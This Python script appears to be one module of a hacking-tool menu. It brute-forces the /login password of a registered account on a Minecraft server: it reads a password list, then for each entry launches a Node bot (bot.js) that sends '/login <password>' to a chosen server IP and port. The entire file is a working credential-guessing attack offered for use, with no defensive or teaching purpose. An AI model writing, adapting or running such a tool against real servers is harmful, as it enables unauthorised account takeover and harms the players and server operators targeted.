#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import subprocess
import time
import os
from utils import clear, print_banner, gradient_print, gradient_input

def bruteauth_interactive():
    clear()
    print_banner()
    gradient_print(" Brute-force /login password (via bot)", 0.03)
    ip = gradient_input(" Server IP: ").strip()
    port_str = gradient_input(" Port (default 25565): ").strip()
    port = int(port_str) if port_str.isdigit() else 25565
    version = gradient_input(" Minecraft version: ").strip() or "1.16.5"
    username = gradient_input(" Bot username (must be registered): ").strip()
    if not username:
        gradient_print(" Username required.", 0.03)
        time.sleep(1.5)
        return
    passwords_file = gradient_input(" Password list file (one per line): ").strip()
    try:
        with open(passwords_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except:
        gradient_print(" Could not read password file.", 0.03)
        time.sleep(1.5)
        return
    gradient_print(f" Testing {len(passwords)} passwords...", 0.03)
    for i, pwd in enumerate(passwords):
        cmdfile = f"temp_cmds_{int(time.time())}_{i}.txt"
        with open(cmdfile, 'w') as f:
            f.write(f"/login {pwd}\n!test\n")
        proc = subprocess.Popen(["node", "bot.js", ip, str(port), version, username, cmdfile],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
        proc.terminate()
        gradient_print(f" Tested password {i+1}: {pwd}", 0.01)
        os.remove(cmdfile)
    gradient_print(" Brute-force finished.", 0.03)
    gradient_input(" Press Enter to return to menu...")